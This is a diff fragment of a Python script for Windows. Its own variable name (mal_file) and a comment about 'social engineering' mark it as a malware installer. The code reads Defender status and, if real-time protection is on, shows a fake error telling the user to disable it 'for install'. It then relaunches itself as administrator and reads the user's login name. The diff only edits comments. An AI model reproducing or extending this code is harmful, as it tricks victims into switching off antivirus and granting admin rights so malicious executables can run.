@@ -27,15 +27,16 @@ if name != "nt":  # _Checks_If_Operating_System_Is_Windows_And_Exits_If_Not
     exit()
 
 win_av = run('powershell.exe Get-MpComputerStatus', shell=True, capture_output=True).stdout.decode()
-if search("RealTimeProtectionEnabled        : True", win_av):
+
+if search("RealTimeProtectionEnabled        : True", win_av): 
     ctypes.windll.user32.MessageBoxW(0, "Real Time Protection Must Be Disabled For Install", "Error", 1)
     exit()
-else:  # _Checks_If_Windows_Anti-Virus_Real_Time_Protection_Is_Enabled_And_Requires_It_To_Be_Off
+else:  # _Checks_If_Windows_Anti-Virus_Real_Time_Protection_Is_Enabled_And_Works_Some_Social_engineering_magic
     print("SUCCESS")
 sleep(0.1)
 
 
-def is_usr_admin():  # _Checks_If_Script_Has_Admin_Privs
+def is_usr_admin():  # _Checks_If_Script_Has_Admin_Privs_And_Exits_If_Not_Administrator
     if not ctypes.windll.shell32.IsUserAnAdmin():
         print("ERROR")
         ctypes.windll.shell32.ShellExecuteW(
@@ -47,7 +48,7 @@ def is_usr_admin():  # _Checks_If_Script_Has_Admin_Privs
 
 is_usr_admin()
 
-CURRENT_USER = os.getenv('username')
+CURRENT_USER = os.getenv('username')  #_Gets_The_Users_Login_Name_This_Is_A_crucial_Variable_Dont_Change_It
 
 #_Fill_These_Variable_To_Suit_Your_Needs_↓↓↓↓↓↓↓↓↓↓↓
 mal_file = "($cript!).exe"  # _NAME_OF_THE_SCRIPT_MUST_GO_HERE_!!!
